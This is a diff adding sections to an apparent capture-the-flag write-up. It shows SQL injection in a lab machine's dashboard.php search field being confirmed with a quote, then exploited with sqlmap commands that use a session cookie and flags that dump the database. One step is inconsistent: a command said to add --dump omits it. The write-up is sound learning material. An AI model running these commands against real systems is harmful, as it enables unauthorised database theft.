@@ -253,8 +253,6 @@ Upgrade-Insecure-Requests: 1
 Host: 10.10.10.46
 ```
 
-TODO
-
 ## Trying `dirb`
 
 Going to run `dirb` and see what directories it shows.
@@ -266,3 +264,48 @@ Going to run `dirb` and see what directories it shows.
 ```
 
 Nothing useful.
+
+## It is SQLi!
+  
+I came back the next day, and saw that this URL:
+
+    http://10.10.10.46/dashboard.php?search=a%27
+
+Results in this output near the end of the HTTP document:
+
+        <tbody>
+        ERROR:  unterminated quoted string at or near "'"
+    LINE 1: Select * from cars where name ilike '%a'%'
+                                                    ^
+
+This shows me that I can inject SQL into this page -- and I should retry my `sqlmap` command.
+
+## sqlmap part 2 
+
+```
+sqlmap http://10.10.10.46/dashboard.php?search=test --cookie="PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4"
+```
+
+Looks like it succeeded, but I don't think a full DB dump was achieved from looking at the summary.
+
+I'm a dummy -- I need to pass `--dump`...
+
+```
+sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4"
+```
+
+It worked, and I got a full DB dump. Sadly only got one table from it -- I'm going to try to use Metasploit to exploit this SQLi further.
+
+Not sure if I should be getting more tables, or if I should be trying command injection instead.
+
+I just read this guide:
+
+    https://www.hackers-arise.com/post/2017/04/24/database-hacking-part-4-extracting-data-with-sqlmap
+
+And I should have added `--dbs`/`--tables`/`--columns` because those flags specifically enumerate entities. `sqlmap` tool will remember a per-host view of what the previously-enumerated entity names are.
+
+I just realized `--all` does all enumeration, and I can do `--all` since I'm lazy.
+
+    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4" --all
+
+TODO show output
